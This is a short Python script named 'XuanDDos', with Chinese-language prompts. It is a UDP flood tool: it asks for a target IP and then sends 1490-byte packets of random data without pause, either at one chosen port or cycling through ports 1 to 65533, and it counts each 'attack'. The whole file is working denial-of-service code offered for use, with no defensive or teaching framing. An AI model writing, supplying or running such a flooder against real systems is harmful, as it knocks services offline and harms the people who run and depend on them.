import sys
import os
import time
import socket
import random
import keyboard
print("XuanDDos")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
ip = input("目标IP:")
while True:
    ModeChoose = input("是否开启全端口攻击模式(YES/NO):")
    if ModeChoose == "YES":
        AttackMode = "AllPort"
        break
    elif ModeChoose == "NO":
        AttackMode = "OnePort"
        OP = int(input("请输入你要攻击的端口:"))
        OPstr = str(OP)
        break
port = 1
sent = 0
print("按下ESC键开始DDos,按下ctrl键停止DDos")
keyboard.wait("esc")
if AttackMode == "AllPort":
    while True:
        sock.sendto(bytes,(ip,port))
        sent = sent + 1
        SentStr = str(sent)
        port = port + 1
        PortStr = str(port-1)
        print("对"+ip+"进行了第"+SentStr+"次攻击,当前攻击端口:"+PortStr)
        if port == 65534:
             port = 1
        if keyboard.is_pressed("ctrl") == True:
            break
elif AttackMode == "OnePort":
    while True:
        sock.sendto(bytes,(ip,OP))
        sent = sent + 1
        SentStr = str(sent)
        print("对"+ip+"进行了第"+SentStr+"次攻击,当前攻击端口:"+OPstr)
        if keyboard.is_pressed("ctrl") == True:
            break
